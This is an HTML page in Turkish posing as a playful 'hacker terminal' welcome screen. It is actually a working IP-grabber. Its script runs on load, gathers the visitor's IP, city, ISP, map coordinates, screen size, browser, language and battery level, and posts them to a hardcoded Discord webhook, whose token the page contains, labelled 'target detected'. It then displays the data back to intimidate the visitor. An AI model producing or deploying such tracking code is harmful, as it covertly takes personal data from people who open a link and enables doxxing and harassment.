<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome Qeat'S World</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .terminal { width: 95%; max-width: 800px; background: rgba(0, 0, 0, 0.95); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative; }
        .line { margin-bottom: 12px; font-size: 14px; white-space: nowrap; overflow: hidden; border-right: .15em solid orange; width: 0; }
        .type-1 { animation: typing 1s steps(40, end) forwards 0.2s, blink-caret .75s step-end infinite; }
        .type-2 { animation: typing 1s steps(40, end) forwards 1.2s, blink-caret .75s step-end infinite; }
        .type-3 { animation: typing 1s steps(40, end) forwards 2.2s, blink-caret .75s step-end infinite; }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
        .progress-container { width: 100%; background-color: #111; height: 4px; margin: 20px 0; display: none; }
        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
        #result-box { margin-top: 20px; display: none; border-top: 1px solid #333; padding-top: 15px; font-size: 13px; }
        .map-frame { width: 100%; height: 200px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
        .vpn-alert { color: #ffcc00; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffcc00; padding: 8px; text-align: center; }
        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .label { color: #888; }
        .value { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

<div class="terminal">
    <div class="line type-1">> Bir Dakika Bekleyin...</div>
    <div class="line type-2">> İpucu: Eğer canınız sıkılıyorsa bu siteye girin!</div>
    <div class="line type-3">> Tüm Paketler İndirildi</div>
    
    <div class="progress-container" id="loader">
        <div class="progress-bar" id="bar"></div>
    </div>

    <div id="result-box">
        <div id="vpn-msg"></div>
        <div class="data-grid">
            <div><span class="label">> IP:</span> <span class="value" id="user-ip">...</span></div>
            <div><span class="label">> LOKASYON:</span> <span class="value" id="user-loc">...</span></div>
            <div><span class="label">> ISS:</span> <span class="value" id="user-isp">...</span></div>
            <div><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
            <div><span class="label">> EKRAN:</span> <span class="value" id="user-res">...</span></div>
            <div><span class="label">> TARAYICI:</span> <span class="value" id="user-browser">...</span></div>
            <div><span class="label">> DİL:</span> <span class="value" id="user-lang">...</span></div>
            <div><span class="label">> ŞARJ:</span> <span class="value" id="user-bat">...</span></div>
        </div>
        <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
        <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER SİSTEME İŞLENDİ.</div>
    </div>
</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";

    async function captureData() {
        // Ekstra Cihaz Bilgileri
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const language = navigator.language;
        const browser = navigator.userAgent.split(' ').pop();
        let batteryInfo = "Bilinmiyor";

        try {
            const battery = await navigator.getBattery();
            batteryInfo = `%${Math.round(battery.level * 100)}`;
        } catch(e) {}

        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            window.cachedData = {...data, screenRes, language, browser, batteryInfo};
            window.cachedRegNo = Math.floor(Math.random() * 89999) + 10000;

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "DERİN SİSTEM ANALİZİ",
                    embeds: [{
                        title: data.country_code !== 'TR' ? "🕵️ HEDEF VPN ARKASINDA" : "🎯 HEDEF TESPİT EDİLDİ",
                        color: data.country_code !== 'TR' ? 16763904 : 16711680,
                        fields: [
                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
                            { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
                            { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
                            { name: "💻 Ekran", value: `\`${screenRes}\``, inline: true },
                            { name: "🔋 Şarj", value: `\`${batteryInfo}\``, inline: true },
                            { name: "🛠️ Tarayıcı", value: `\`${browser}\``, inline: true }
                        ],
                        timestamp: new Date()
                    }]
                })
            });
        });
    }

    captureData();

    setTimeout(() => {
        const loader = document.getElementById('loader');
        const bar = document.getElementById('bar');
        loader.style.display = 'block';
        let width = 0;
        let interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                finalizeDisplay();
            } else {
                width += 2;
                bar.style.width = width + '%';
            }
        }, 40);
    }, 3200);

    function finalizeDisplay() {
        const data = window.cachedData;
        if (!data) { setTimeout(finalizeDisplay, 1000); return; }

        document.getElementById('user-ip').innerText = data.ip;
        document.getElementById('user-loc').innerText = data.city;
        document.getElementById('user-isp').innerText = data.org;
        document.getElementById('user-sys').innerText = navigator.platform;
        document.getElementById('user-res').innerText = data.screenRes;
        document.getElementById('user-browser').innerText = data.browser;
        document.getElementById('user-lang').innerText = data.language;
        document.getElementById('user-bat').innerText = data.batteryInfo;
        document.getElementById('reg-no').innerText = window.cachedRegNo;
        
        if(data.country_code !== 'TR') {
            document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">VPN TESPİT EDİLDİ :)</div>`;
        }
        document.getElementById('gmap').src = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
        document.getElementById('result-box').style.display = 'block';
    }
</script>
</body>
</html>
